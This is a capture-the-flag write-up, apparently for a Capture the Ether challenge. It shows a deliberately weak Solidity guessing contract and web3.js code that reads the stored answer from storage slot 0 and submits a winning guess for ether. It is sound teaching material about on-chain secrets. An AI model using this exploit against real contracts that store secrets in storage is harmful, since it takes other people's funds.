# 05. Guess the random number

This time the number is generated based on a couple fairly random sources.

## Target contract

```solidity
pragma solidity ^0.4.21;

contract GuessTheRandomNumberChallenge {
    uint8 answer;

    function GuessTheRandomNumberChallenge() public payable {
        require(msg.value == 1 ether);
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

## Vulnerability

This one is a little bit more tricky as the answer is computed pseudo randomly with `answer = uint8(keccak256(block.blockhash(block.number - 1), now));`.
We known `block.number - 1` as it is nothing but the previous block number, but we cannot infer or manipulate `now` unless we are a miner...

Since that contract generates the value when `GuessTheRandomNumberChallenge` is called, but only check it later on inside `guess` it must store that value somewhere.
The answer is stored in storage slot 0, which can be read by anyone :

```js
// Read storage slot 0 of our contract which contains the answer
const answer = await web3.eth.getStorageAt(contract, 0);

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "guess",
    type: "function",
    inputs: [
      {
        type: "uint8",
        name: "n",
      },
    ],
  },
  [answer]
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: contract,
  data: data,
  value: web3.utils.toWei("1", "ether"),
});
```